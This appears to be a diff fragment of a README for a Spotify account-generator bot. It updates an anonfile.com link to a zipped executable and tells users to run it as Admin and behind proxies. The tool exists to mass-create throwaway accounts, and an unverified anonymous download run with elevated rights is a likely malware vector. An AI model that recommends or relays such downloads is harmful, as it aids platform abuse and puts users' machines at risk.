@@ -9,4 +9,4 @@ Generated Accounts only last for 4-6 hours.
 Open as Admin, and use proxies.
 I will not be providing updates or support.
 
-Link: https://anonfile.com/5fl9zcw9oe/Spotify-AccountCreator-1.0.1-Windows-MacOS_zip
+Link: https://anonfile.com/h2Req626oa/SpotifyBOT-Account_Generator_-_1.0.2_zip
